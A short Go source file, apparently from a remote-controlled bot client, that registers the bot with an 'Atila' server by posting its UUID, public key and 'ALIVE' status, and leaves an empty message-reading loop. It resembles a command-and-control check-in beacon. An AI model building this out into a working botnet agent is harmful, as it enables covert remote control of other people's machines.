package main

import (
	"bytes"
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"net/http"
)

// identifyPayload is a structure corresponding to Atila's bot identification endpoint.
type identifyPayload struct {
	Id                string `json:"id"`                // UUID of the bot. (self-generated)
	IdentificationKey string `json:"identificationKey"` // Public key of the bot.
	Status            string `json:"status"`            // Bot's status.
}

// identify makes the bot known to the Atila server. Returns true if identification was successful.
func identify(id string, publicKey *rsa.PublicKey) bool {
	// Bot's identification details which will be stored in the Atila's database.
	details := identifyPayload{
		Id:                id,
		IdentificationKey: publicKeyToPEM(publicKey),
		Status:            "ALIVE",
	}

	detailsJson, err := json.Marshal(details)
	if err != nil {
		fmt.Println(err.Error())
		return false
	}

	request, err := http.NewRequest("POST", atilaHost, bytes.NewBuffer(detailsJson))
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println(err.Error())
		return false
	}
	defer request.Body.Close()

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err.Error())
		return false
	}
	defer response.Body.Close()

	return true
}

// inboxReader is a loop of fetching and interpreting messages.
func inboxReader() {
}
